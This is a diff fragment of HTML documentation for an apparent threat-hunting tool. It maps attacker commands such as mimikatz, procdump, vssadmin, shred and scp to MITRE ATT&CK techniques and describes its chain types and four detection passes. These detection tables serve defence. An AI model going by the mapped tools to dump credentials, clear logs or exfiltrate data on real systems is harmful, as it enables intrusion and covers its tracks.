+<td>Mshta</td>
+</tr>
+<tr>
+<td><code>rundll32</code></td>
+<td>T1218.011</td>
+<td>Rundll32</td>
+</tr>
+<tr>
+<td><code>regsvr32</code></td>
+<td>T1218.010</td>
+<td>Regsvr32</td>
+</tr>
+<tr>
+<td><code>wmic</code></td>
+<td>T1047</td>
+<td>Windows Management Instrumentation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="defense-evasion">Defense Evasion</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>shred</code>, <code>truncate</code></td>
+<td>T1070.002</td>
+<td>Clear Linux Logs</td>
+</tr>
+<tr>
+<td><code>history</code>, <code>unset</code></td>
+<td>T1070.003</td>
+<td>Clear Command History</td>
+</tr>
+<tr>
+<td><code>chmod</code></td>
+<td>T1222</td>
+<td>File and Directory Permissions Modification</td>
+</tr>
+<tr>
+<td><code>certutil</code></td>
+<td>T1140</td>
+<td>Deobfuscate/Decode Files or Information</td>
+</tr>
+<tr>
+<td><code>vssadmin</code>, <code>bcdedit</code></td>
+<td>T1490</td>
+<td>Inhibit System Recovery</td>
+</tr>
+<tr>
+<td><code>fsutil</code></td>
+<td>T1070</td>
+<td>Indicator Removal</td>
+</tr>
+</tbody>
+</table>
+<h3 id="discovery">Discovery</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>whoami</code>, <code>id</code></td>
+<td>T1033</td>
+<td>System Owner/User Discovery</td>
+</tr>
+<tr>
+<td><code>uname</code>, <code>hostname</code></td>
+<td>T1082</td>
+<td>System Information Discovery</td>
+</tr>
+<tr>
+<td><code>ps</code></td>
+<td>T1057</td>
+<td>Process Discovery</td>
+</tr>
+<tr>
+<td><code>netstat</code>, <code>ss</code></td>
+<td>T1049</td>
+<td>System Network Connections Discovery</td>
+</tr>
+<tr>
+<td><code>ifconfig</code>, <code>ip</code></td>
+<td>T1016</td>
+<td>System Network Configuration Discovery</td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td>T1083</td>
+<td>File and Directory Discovery</td>
+</tr>
+<tr>
+<td><code>nmap</code>, <code>masscan</code></td>
+<td>T1046</td>
+<td>Network Service Scanning</td>
+</tr>
+<tr>
+<td><code>net</code>, <code>net1</code></td>
+<td>T1069</td>
+<td>Permission Groups Discovery</td>
+</tr>
+</tbody>
+</table>
+<h3 id="lateral-movement-exfiltration">Lateral Movement / Exfiltration</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ssh</code></td>
+<td>T1021.004</td>
+<td>Remote Services: SSH</td>
+</tr>
+<tr>
+<td><code>scp</code>, <code>rsync</code>, <code>ftp</code>, <code>sftp</code></td>
+<td>T1048</td>
+<td>Exfiltration Over Alternative Protocol</td>
+</tr>
+</tbody>
+</table>
+<h3 id="archive-staging">Archive / Staging</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>tar</code>, <code>zip</code>, <code>gzip</code></td>
+<td>T1560.001</td>
+<td>Archive Collected Data via Utility</td>
+</tr>
+<tr>
+<td><code>base64</code></td>
+<td>T1132.001</td>
+<td>Data Encoding: Standard Encoding</td>
+</tr>
+</tbody>
+</table>
+<h3 id="persistence">Persistence</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>crontab</code></td>
+<td>T1053.003</td>
+<td>Scheduled Task/Job: Cron</td>
+</tr>
+<tr>
+<td><code>at</code></td>
+<td>T1053.001</td>
+<td>Scheduled Task/Job: At</td>
+</tr>
+<tr>
+<td><code>useradd</code>, <code>adduser</code></td>
+<td>T1136.001</td>
+<td>Create Account: Local Account</td>
+</tr>
+<tr>
+<td><code>usermod</code></td>
+<td>T1098</td>
+<td>Account Manipulation</td>
+</tr>
+<tr>
+<td><code>passwd</code></td>
+<td>T1531</td>
+<td>Account Access Removal</td>
+</tr>
+<tr>
+<td><code>schtasks</code></td>
+<td>T1053.005</td>
+<td>Scheduled Task</td>
+</tr>
+<tr>
+<td><code>sc</code></td>
+<td>T1543.003</td>
+<td>Windows Service</td>
+</tr>
+<tr>
+<td><code>reg</code>, <code>regedit</code></td>
+<td>T1112</td>
+<td>Modify Registry</td>
+</tr>
+<tr>
+<td><code>bitsadmin</code></td>
+<td>T1197</td>
+<td>BITS Jobs</td>
+</tr>
+</tbody>
+</table>
+<h3 id="credential-access">Credential Access</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Technique</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>john</code>, <code>hashcat</code></td>
+<td>T1110.002</td>
+<td>Brute Force: Password Cracking</td>
+</tr>
+<tr>
+<td><code>hydra</code></td>
+<td>T1110.001</td>
+<td>Brute Force: Password Guessing</td>
+</tr>
+<tr>
+<td><code>mimikatz</code></td>
+<td>T1003</td>
+<td>OS Credential Dumping</td>
+</tr>
+<tr>
+<td><code>procdump</code></td>
+<td>T1003.001</td>
+<td>LSASS Memory</td>
+</tr>
+<tr>
+<td><code>ntdsutil</code></td>
+<td>T1003.003</td>
+<td>NTDS</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="attack-chain-types">Attack Chain Types</h2>
+<p>The hunter classifies each detected actor into one of five chain types:</p>
+<table>
+<thead>
+<tr>
+<th>Chain Type</th>
+<th>Meaning</th>
+<th><code>compromised</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>brute_force</code></td>
+<td>Many failures, no successful logon</td>
+<td><code>False</code></td>
+</tr>
+<tr>
+<td><code>credential_stuffing</code></td>
+<td>Failures followed by a successful logon</td>
+<td><code>True</code></td>
+</tr>
+<tr>
+<td><code>post_exploitation</code></td>
+<td>Success + post-exploit actions (process creation, shell, service)</td>
+<td><code>True</code></td>
+</tr>
+<tr>
+<td><code>unauthorized_access</code></td>
+<td>Successful logon with no prior failures (silent compromise)</td>
+<td><code>True</code></td>
+</tr>
+<tr>
+<td><code>lateral_movement</code></td>
+<td>High-value persistence/LM events with no logon evidence</td>
+<td><code>True</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="detection-pathways">Detection Pathways</h2>
+<p><code>build_attack_chains()</code> runs four passes over the full event list:</p>
+<table>
+<thead>
+<tr>
+<th>Pass</th>
+<th>Trigger</th>
+<th>Catches</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 — Brute-Force</td>
+<td>≥5 failures from same IP</td>
+<td>SSH brute force, password spray</td>
+</tr>
+<tr>
+<td>2 — Silent Access</td>
+<td>Successful logon, zero prior failures from same IP</td>
+<td>NTLM relay, pass-the-hash, golden/silver ticket</td>
+</tr>
+<tr>
+<td>3 — Probe</td>
+<td>≥3 Kerberos TGT/service-ticket requests from same IP</td>
+<td>Kerberoasting, AS-REP roasting, Kerberos password spray</td>
+</tr>
+<tr>
+<td>4 — High-Value Sweep</td>
+<td>Service installs, scheduled tasks, group changes, share access</td>
+<td>Persistence and lateral movement with no network attribution</td>
+</tr>
+</tbody>
+</table>
+<p>Events not claimed by Passes 1–3 fall to Pass 4, which groups them by user account
+(or anonymous bucket) and produces lateral-movement chains.</p>
 
 
 
